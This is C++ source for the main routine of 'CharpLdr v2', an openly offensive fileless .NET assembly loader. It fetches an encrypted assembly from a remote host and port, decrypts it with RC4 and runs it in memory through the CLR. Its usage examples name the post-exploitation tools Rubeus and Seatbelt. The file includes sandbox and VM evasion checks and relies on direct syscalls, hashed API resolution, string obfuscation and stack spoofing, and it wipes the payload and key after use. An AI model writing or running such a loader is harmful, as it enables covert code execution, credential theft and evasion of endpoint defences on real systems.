#include "peb_walk.h"
#include "hash.h"
#include "obfstr.h"
#include "syscalls.h"
#include "stackspoof.h"
#include "crypto.h"
#include "network.h"
#include "clr.h"
#include "threadpool.h"
#include <cstdlib>
#include <cstring>
#include <cstdio>

static void print_usage(const char* exe) {
    printf("CharpLdr v2 - Fileless .NET Assembly Loader\n\n");
    printf("Usage: %s [options] <host> <port> <resource> [assembly_args...]\n\n", exe);
    printf("Arguments:\n");
    printf("  host              Server IP or hostname\n");
    printf("  port              Server port\n");
    printf("  resource          Path to encrypted assembly (e.g. /Rubeus.enc)\n");
    printf("  assembly_args     Arguments passed to the .NET assembly\n\n");
    printf("Options:\n");
    printf("  -h, --help        Show this help message\n");
    printf("  --no-sandbox      Disable sandbox/VM checks\n\n");
    printf("Examples:\n");
    printf("  %s 192.168.1.10 8443 /Rubeus.enc triage\n", exe);
    printf("  %s --no-sandbox 10.0.0.5 80 /Seatbelt.enc -group=all\n", exe);
}

static bool sandbox_check() {
    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return false;

    if (GetTickCount64() < 20ULL * 60 * 1000) return false;

    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return false;

    ULONGLONG t0 = GetTickCount64();
    Sleep(1500);
    if (GetTickCount64() - t0 < 1400) return false;

    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 2) { print_usage(argv[0]); return 1; }

    int arg_offset = 1;
    bool skip_sandbox = false;

    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
        print_usage(argv[0]);
        return 0;
    }
    if (strcmp(argv[1], "--no-sandbox") == 0) {
        skip_sandbox = true;
        arg_offset = 2;
    }

    if (!skip_sandbox && !sandbox_check()) return 0;

    int remaining = argc - arg_offset;
    if (remaining < 3) { print_usage(argv[0]); return 1; }

    const char* host = argv[arg_offset];
    const char* port = argv[arg_offset + 1];
    const char* resource = argv[arg_offset + 2];

    int asm_argc = remaining - 3;
    const char** asm_args = (asm_argc > 0) ? const_cast<const char**>(&argv[arg_offset + 3]) : nullptr;

    if (!resolve_phase1_ntdll()) return 1;
    if (!resolve_phase2_kernel32()) return 1;
    if (!resolve_syscalls()) return 1;
    init_spoof();

    if (!resolve_phase3_winsock()) return 1;

    size_t enc_size = 0;
    unsigned char* enc_payload = download_payload(host, port, resource, &enc_size);
    if (!enc_payload || enc_size == 0) return 1;

    decrypt_payload(enc_payload, enc_size);

    if (enc_size < 2 || enc_payload[0] != 'M' || enc_payload[1] != 'Z') {
        free(enc_payload);
        return 1;
    }

    if (!resolve_phase4_mscoree()) {
        free(enc_payload);
        return 1;
    }

    bool exec_ok = execute_via_threadpool(enc_payload, enc_size, asm_args, asm_argc);

    if (enc_payload) {
        volatile unsigned char* vp = reinterpret_cast<volatile unsigned char*>(enc_payload);
        for (size_t i = 0; i < enc_size; i++) vp[i] = 0;
        free(enc_payload);
    }

    size_t key_len = 0;
    const unsigned char* key = get_rc4_key(&key_len);
    volatile unsigned char* vk = const_cast<volatile unsigned char*>(key);
    for (size_t i = 0; i < key_len; i++) vk[i] = 0;

    return exec_ok ? 0 : 1;
}
